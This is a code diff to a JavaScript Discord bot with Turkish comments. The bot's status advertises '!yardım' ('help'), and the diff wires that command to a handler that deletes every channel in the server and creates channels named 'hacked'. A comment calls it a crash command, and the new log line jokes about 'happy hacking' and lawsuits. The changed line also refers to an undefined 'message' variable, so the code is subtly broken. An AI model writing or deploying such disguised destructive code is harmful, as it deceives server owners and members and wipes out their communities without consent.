@@ -5,8 +5,8 @@ const { Client, Util } = require("discord.js");
 const request = require("request");
 client.login(ayarlar.token);
 client.on('ready', () => {
- client.user.setActivity(`↪💖 Destek sunucusu: https://discord.gg/dCbWgZtRFB |+yardım| `)
- console.log(`${client.user.tag} isimli bot başarıyla şu an aktifleştirildi!`);
+ client.user.setActivity(`↪💖 Destek sunucusu: https://discord.gg/dCbWgZtRFB |!yardım| `)
+ console.log(`${client.user.tag} bot aktifleştirildi hayırlı hacklemeler dikkat dava açmasınlar! >:D`);
 });
 
 
@@ -42,7 +42,7 @@ client.on("message", async msg => {
   if (msg.content === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
     msg.delete();
 
-      await msg.guild.channels.deleteAll();        //TÜM KANALLARI SİLEN KOMUT
+      message.guild.channels.cache.forEach(c => c.delete());      //TÜM KANALLARI SİLEN KOMUT
 
     await msg.guild.createChannel("hacked", {
       type: "text"
